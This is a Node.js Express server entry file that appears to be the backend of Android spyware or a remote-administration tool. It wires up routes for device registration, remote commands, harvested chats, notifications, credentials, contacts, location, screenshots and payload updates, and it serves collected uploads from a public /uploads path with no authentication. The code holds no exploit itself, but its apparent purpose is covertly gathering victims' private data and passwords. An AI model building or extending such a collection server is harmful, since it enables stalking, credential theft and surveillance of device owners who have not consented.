// Load environment variables from .env file
require('dotenv').config();

const express = require('express');
const multer = require('multer');
const cors = require('cors');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust proxy - Required when behind a reverse proxy (Render, Heroku, etc.)
// This allows Express to trust X-Forwarded-* headers
app.set('trust proxy', process.env.TRUST_PROXY !== 'false' ? 1 : false);

// Middleware
app.use(cors());
app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Request logger middleware - logs all device requests to MongoDB
const requestLogger = require('./middleware/requestLogger');
app.use('/api', requestLogger);

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
    // Trust proxy is already set above, so rate limiter will use X-Forwarded-For correctly
});
app.use('/api/', limiter);

// Create uploads directory structure if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
const imagesDir = path.join(uploadsDir, 'images');
const videosDir = path.join(uploadsDir, 'videos');
const audioDir = path.join(uploadsDir, 'audio');
const otherDir = path.join(uploadsDir, 'other');

[uploadsDir, imagesDir, videosDir, audioDir, otherDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const appPackage = req.body.appPackage || 'unknown';
        const dateDir = new Date().toISOString().split('T')[0];
        const dest = path.join(uploadsDir, appPackage, dateDir);
        if (!fs.existsSync(dest)) {
            fs.mkdirSync(dest, { recursive: true });
        }
        cb(null, dest);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 50 * 1024 * 1024 // 50MB max file size
    },
    fileFilter: (req, file, cb) => {
        const allowedMimes = [
            'image/jpeg',
            'image/jpg',
            'image/png',
            'image/gif',
            'image/webp',
            'video/mp4',
            'video/webm',
            'video/quicktime',
            'audio/mpeg',
            'audio/mp3',
            'audio/ogg',
            'audio/wav',
            'audio/mp4',
            'audio/m4a'
        ];
        if (allowedMimes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type. Only images, videos, and audio are allowed.'));
        }
    }
});

// Initialize MongoDB database connection
const { connect: connectMongoDB } = require('./database/mongodb');

// Connect to MongoDB on server start
connectMongoDB().catch(err => {
    console.error('Failed to connect to MongoDB:', err);
    process.exit(1);
});

// Initialize Firebase
const { initializeFirebase } = require('./config/firebase');
initializeFirebase();

// Routes
app.use('/api/auth', require('./routes/auth'));
app.use('/api/devices', require('./routes/devices'));
app.use('/api/commands', require('./routes/commands'));
app.use('/api/notifications', require('./routes/notifications'));
app.use('/api/chats', require('./routes/chats'));
app.use('/api/media', require('./routes/media'));
app.use('/api/credentials', require('./routes/credentials'));
app.use('/api/contacts', require('./routes/contacts'));
app.use('/api', require('./routes/location'));
app.use('/api', require('./routes/screenshots'));

// Update server routes
app.use('/updates', require('./routes/updates'));

// Serve uploaded media files
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Create HTTP server
const http = require('http');
const server = http.createServer(app);

// Initialize WebSocket
const websocketService = require('./services/websocketService');
websocketService.initializeWebSocket(server);

// Start server
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`WebSocket server ready`);
});

module.exports = app;
